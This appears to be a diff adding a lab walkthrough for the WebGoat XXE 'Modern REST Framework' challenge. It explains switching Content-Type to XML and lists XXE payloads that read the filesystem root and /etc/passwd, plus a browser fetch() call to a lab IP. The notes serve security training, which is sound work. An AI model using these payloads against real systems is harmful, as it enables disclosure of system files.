@@ -1,0 +1,127 @@
+====================================================================
+     XXE - MODERN REST FRAMEWORK CHALLENGE
+====================================================================
+
+Challenge: Perform XXE injection on a JSON API endpoint that also accepts XML
+
+Key Insight: Modern REST frameworks sometimes accept multiple content types
+even when they're designed for JSON. By changing Content-Type to XML, you
+can potentially exploit XXE vulnerabilities.
+
+====================================================================
+ATTACK STRATEGY:
+====================================================================
+
+The comments endpoint likely expects JSON:
+POST /WebGoat/xxe/content-type
+Content-Type: application/json
+{"comment": "..."}
+
+BUT: Try sending XML instead:
+POST /WebGoat/xxe/content-type  
+Content-Type: application/xml
+<?xml version="1.0"?>
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>
+<comment>&xxe;</comment>
+
+====================================================================
+PAYLOADS TO TRY:
+====================================================================
+
+1. Simple XXE with file:///
+---------------------------
+<?xml version="1.0"?>
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>
+<comment><text>&xxe;</text></comment>
+
+2. Compact format (no XML declaration):
+---------------------------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+3. Different root element:
+--------------------------
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///">]><root>&xxe;</root>
+
+4. Read /etc/passwd:
+--------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>
+
+====================================================================
+BROWSER CONSOLE METHOD (EASIEST):
+====================================================================
+
+1. Open WebGoat XXE lesson (Modern REST Framework section)
+2. Open DevTools (F12) → Network tab
+3. Submit a normal comment to see the request
+4. Note the endpoint (probably /WebGoat/xxe/content-type or similar)
+5. Open Console tab
+6. Run this command:
+
+fetch("http://192.168.254.112:8001/WebGoat/xxe/content-type", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+====================================================================
+KEY DIFFERENCES FROM FIRST XXE CHALLENGE:
+====================================================================
+
+Challenge 1 (Simple XXE):
+- Endpoint: /WebGoat/xxe/simple
+- Already expects XML
+- DOCTYPE injection in comment field
+
+Challenge 2 (Modern REST):
+- Endpoint: /WebGoat/xxe/content-type (or similar)
+- Expects JSON normally
+- **Must change Content-Type to application/xml**
+- Framework auto-parses based on Content-Type header
+
+====================================================================
+POSSIBLE ENDPOINTS:
+====================================================================
+
+- /WebGoat/xxe/content-type
+- /WebGoat/xxe/comments
+- /WebGoat/xxe/rest
+- /WebGoat/xxe/modern
+- /WebGoat/xxe/json
+
+Check Network tab to find the correct one!
+
+====================================================================
+WHAT TO LOOK FOR:
+====================================================================
+
+Success indicators:
+- Directory listing (bin, boot, dev, etc, home, root)
+- File contents in response
+- Lesson marked complete
+
+The vulnerability exists because:
+1. Spring Boot / JAX-RS accept multiple content types
+2. If you send XML with Content-Type: application/xml
+3. Framework auto-parses it as XML
+4. Even though endpoint was designed for JSON!
+
+====================================================================
+TROUBLESHOOTING:
+====================================================================
+
+Issue: "Unsupported Media Type (415)"
+Solution: Make sure Content-Type is exactly "application/xml"
+
+Issue: "Bad Request (400)"
+Solution: Check XML syntax, try different formats
+
+Issue: "No output"
+Solution: Try different file paths or use error-based XXE
+
+Issue: "Works but lesson not complete"
+Solution: Check if you need to submit the output as a flag
+
+====================================================================
